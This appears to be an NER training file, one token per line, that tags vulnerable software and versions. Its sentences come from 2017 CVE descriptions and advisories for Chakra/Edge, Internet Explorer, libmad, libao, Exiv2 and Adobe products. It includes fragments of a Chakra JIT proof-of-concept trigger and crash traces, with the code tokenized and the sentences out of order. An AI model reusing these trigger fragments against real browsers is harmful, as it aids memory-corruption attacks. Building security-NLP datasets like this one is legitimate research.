CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edg O O
e O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

bool O O
Lowerer O O
: O O
:GenerateStFldWithCachedType O O
( O O
IR O O
: O O
:Instr O O
instrStFld O O
, O O
bool O O
continueAsHelperOut O O
, O O
IR O O
: O O
:LabelInstr O O
labelHelperOut O O
, O O
IR O O
: O O
:RegOpnd O O
typeOpndOut O O
instrStFld- O O
> O O
m_opcode O O
= O O
Js O O
: O O
:OpCode O O
: O O
:BailOut O O
; O O
instrStFld- O O
> O O
FreeSrc1 O O
( O O
) O O
; O O
should O O
call O O
FreeSrc2 O O
instrStFld- O O
> O O
FreeDst O O
( O O
) O O
; O O
this- O O
> O O
GenerateBailOut O O
( O O
instrStFld O O
PoC O O
: O O
class O O
MyClass O O
{ O O
constructor O O
( O O
) O O
{ O O
this.arr O O
= O O
[ O O
1 O O
, O O
2 O O
, O O
3 O O
] O O
; O O
} O O
f O O
( O O
) O O
{ O O
super.arr O O
= O O
; O O
this.x O O
; O O
for O O
passing O O
BackwardPass O O
: O O
:DeadStoreTypeCheckBailOut O O
} O O

49 O O
FF O O
C5 O O
is O O
x86-64 O O
code O O
actually O O
generated O O
and O O
disassembled O O
as O O
inc O O
r13 O O
. O O

So O O
, O O
what O O
happens O O
if O O
a O O
Call O O
instruction O O
has O O
Src2 O O

This O O
is O O
performed O O
by O O
the O O
method O O
Lowerer O O
: O O
:GenerateBailOut O O
. O O

So O O
the O O
following O O
method O O
should O O
have O O
freed O O
Src2 O O
. O O

The O O
result O O
will O O
anyway O O
go O O
into O O
the O O
return O O
register O O
, O O
but O O
the O O
register O O
allocator O O
does O O
not O O
need O O
to O O
kill O O
that O O
register O O
for O O
the O O
call O O
. O O

In O O
these O O
cases O O
, O O
it O O
ends O O
up O O
to O O
be O O
converted O O
to O O
Js O O
: O O
:OpCode O O
: O O
:Call O O
with O O
Src2 O O
. O O

PoC O O
bug O O
: O O
The O O
following O O
buggy O O
method O O
is O O
used O O
to O O
convert O O
a O O
St O O
Fld O O
instruction O O
to O O
a O O
bailout O O
. O O

} O O
let O O
c O O
= O O
new O O
MyClass O O
( O O
) O O
; O O
for O O
( O O
let O O
i O O
= O O
0 O O
; O O
i O O
< O O
0x10000 O O
; O O
i++ O O
) O O
{ O O
c.f O O
( O O
) O O
; O O
} O O

Unlike O O
just O O
StFld O O
instructions O O
, O O
StSuperFld O O
instructions O O
take O O
Src2 O O
as O O
this O O
. O O

Microsoft O O
Edge O O
Chakra O O
JIT O O
- O O
Incorrect O O
GenerateBailOut O O
Calling O O
Patterns O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

jscript O O
! O O
JSONStringifyArray+0x38f O O
: O O
000007fe`edbf9fb3 O O
66214738 O O
and O O
word O O
ptr O O
[ O O
rdi+38h O O
] O O
, O O
ax O O
ds:00000000`04518fc8= O O

Microsoft S-vulnerable_software pair_0
Internet S-vulnerable_software pair_0
Explorer S-vulnerable_software pair_0
11 S-vulnerable_version pair_0
- O O
jscript O O
! O O
JSONStringifyObject O O
Use-After-Free O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ChakraCore O O
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
ChakraCore O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
and O O
CVE-2017-8756 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
Microsoft O O
Edge O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ScopeType_CatchParamPattern O O
: O O
ScopeType_Catch O O
ParseNodePtr O O
pnodePattern O O
= O O
ParseDestructuredLiteral O O
< O O
buildAST O O
> O O
( O O
tkLET O O
, O O
true O O
isDecl O O
/ O O
, O O
true O O
topLevel O O
/ O O
, O O
DIC_ForceErrorOnInitializer O O
1 O O
. O O

But O O
pnodeCatchScope O O
is O O
not O O
inserted O O
into O O
the O O
AST O O
. O O

If O O
the O O
parser O O
meets O O
eval O O
in O O
ParseDestructuredLiteral O O
, O O
it O O
calls O O
pnodeCatchScope- O O
> O O
SetCallsEval O O
. O O

Chakra O O
handles O O
this O O
from O O
the O O
parser O O
. O O

ParseNodePtr O O
Parser O O
: O O
:ParseCatch O O
pnodeCatchScope O O
= O O
StartParseBlock O O
< O O
buildAST O O
> O O
( O O
PnodeBlockType O O
: O O
:Regular O O
, O O
isPattern O O

pnodeCatchScope O O
is O O
a O O
temporary O O
block O O
used O O
to O O
create O O
a O O
scope O O
, O O
and O O
it O O
is O O
not O O
actually O O
inserted O O
into O O
the O O
AST O O
. O O

There O O
is O O
a O O
Mismatched O O
Memory O O
Management O O
Routines O O
vulnerability O O
in O O
the O O
Exiv2 S-vulnerable_software pair_0
: O O
:FileIo O O
: O O
:seek O O
function O O
of O O
Exiv2 O O
0.26 S-vulnerable_version pair_0
that O O
will O O
lead O O
to O O
a O O
remote O O
denial O O
of O O
service O O
attack O O
( O O
heap O O
memory O O
corruption O O
) O O
via O O
crafted O O
input O O
. O O

mpg321.c O O
in O O
mpg321 S-vulnerable_software pair_0
0.3.2-1 S-vulnerable_version pair_0
does O O
not O O
properly O O
manage O O
memory O O
for O O
use O O
with O O
libmad O O
0.15.1b S-vulnerable_version O
, O O
which O O
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
seen O O
in O O
a O O
crash O O
in O O
the O O
mad_decoder_run O O
function O O
in O O
decoder.c O O
in O O
libmad O O
) O O
via O O
a O O
crafted O O
MP3 O O
file O O
. O O

libmad O O
memory O O
corruption O O
vulnerability O O
Author O O
: O O
qflb.wu O O
Introduction O O
: O O
libmad O O
is O O
a O O
high-quality O O
MPEG O O
audio O O
decoder O O
capable O O
of O O
24-bit O O
output O O
. O O

Description O O
: O O
the O O
mad_decoder_run O O
function O O
in O O
decoder.c O O
in O O
libmad S-vulnerable_software pair_0
0.15.1b S-vulnerable_version pair_0
can O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
mp3 O O
file O O
. O O

Affected O O
version O O
: O O
0.15.1b S-vulnerable_version O
Vulnerability O O

I O O
found O O
this O O
bug O O
when O O
I O O
test O O
mpg321 S-vulnerable_software pair_0
0.3.2 S-vulnerable_version pair_0
which O O
used O O
the O O
libmad O O
library O O
. O O

0x00007ffff6bf7cc9 O O
in O O
GI_raise O O
( O O
sig=sig O O
@ O O
entry=6 O O
) O O
at O O
../nptl/sysdeps/unix/sysv/linux/raise.c:56 O O
56../nptl/sysdeps/unix/sysv/linux/raise.c O O
: O O
No O O
such O O
file O O
or O O
directory O O
. O O

libmad S-vulnerable_software pair_0
0.15.1b S-vulnerable_version pair_0
- O O
mp3 O O
Memory O O
Corruption O O

_tokenize_matrix O O
function O O
in O O
audio_out.c O O
in O O
Xiph.Org S-vulnerable_software pair_0
libao S-vulnerable_software pair_0
1.2.0 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
MP3 O O
file O O
. O O

Description O O
: O O
the O O
_tokenize_matrix O O
function O O
in O O
audio_out.c O O
in O O
Xiph.Org S-vulnerable_software pair_0
libao S-vulnerable_software pair_0
1.2.0 S-vulnerable_version pair_0
can O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
mp3 O O
file O O
. O O

I O O
found O O
this O O
bug O O
when O O
I O O
test O O
mpg321 S-vulnerable_software pair_0
0.3.2 S-vulnerable_version pair_0
which O O
used O O
the O O
libao O O
library O O
. O O

_int_malloc O O
( O O
av=av O O
@ O O
entry=0x7ffff6f7f760 O O
< O O
main_arena O O
> O O
, O O
bytes=bytes O O
@ O O
entry=3 O O
) O O
at O O
malloc.c:3740 O O
3740malloc.c O O
: O O
No O O
such O O
file O O
or O O
directory O O
. O O

Affected O O
version O O
: O O
1.2.0 S-vulnerable_version O
Vulnerability O O

libao S-vulnerable_software pair_0
1.2.0 S-vulnerable_version pair_0
- O O
Denial O O
of O O
Service O O

An O O
issue O O
was O O
discovered O O
in O O
Adobe S-vulnerable_software pair_0
Photoshop S-vulnerable_software pair_0
18.1.1 S-vulnerable_version pair_0
( O O
2017.1.1 S-vulnerable_version pair_0
) O O
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions O O
. O O

An O O
exploitable O O
memory O O
corruption O O
vulnerability O O
exists O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
Adobe S-vulnerable_software pair_0
InDesign S-vulnerable_software pair_0
12.1.0 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
4.5.6 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions O O
. O O

An O O
exploitable O O
memory O O
corruption O O
vulnerability O O
exists O O
, O O
which O O
could O O
lead O O
to O O
disclosure O O
of O O
memory O O
addresses O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
Adobe S-vulnerable_software pair_0
Shockwave S-vulnerable_software pair_0
12.2.9.199 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
. O O

This O O
affects O O
26.0.0.151 S-vulnerable_version O
and S-vulnerable_version O
earlier S-vulnerable_version O
. O O

Adobe O O
Flash O O
Player O O
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
MP4 O O
atom O O
parser O O
. O O

Adobe O O
Flash O O
- O O
Out-of-Bounds O O
Read O O
in O O
applyToRange O O

Adobe O O
Flash O O
Player O O
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
text O O
handling O O
function O O
. O O

Source O O
: O O
attached O O
MP4 O O
file O O
causes O O
an O O
out-of-bounds O O
memory O O
access O O
when O O
played O O
in O O
flash O O
player O O
. O O

Adobe O O
Flash O O
- O O
Out-of-Bounds O O
Memory O O
Read O O
in O O
MP4 O O
Parsing O O

Source O O
: O O
attached O O
fuzzed O O
MP4 O O
file O O
causes O O
an O O
out-of-bounds O O
memory O O
access O O
when O O
played O O
with O O
Adobe O O
Flash O O
Proof O O
of O O
Concept O O
: O O

Adobe O O
Flash O O
- O O
Out-of-Bounds O O
Write O O
in O O
MP4 O O
Edge O O
Processing O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
transfer O O
of O O
pixel O O
blocks O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
private O O
data O O
representing O O
icons O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
image O O
stream O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
private O O
JPEG O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
private O O
data O O
interpreted O O
as O O
JPEG O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Adobe O O
Graphics O O
Manager O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
internal O O
data O O
structure O O
manipulation O O
related O O
to O O
document O O
encoding O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
drawing O O
ASCII O O
text O O
string O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
private O O
data O O
and O O
the O O
embedded O O
TIF O O
image O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
private O O
data O O
and O O
the O O
embedded O O
GIF O O
image O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
TIFF O O
color O O
map O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Adobe O O
Graphics O O
Manager O O
( O O
AGM O O
) O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JPEG O O
2000 O O
parsing O O
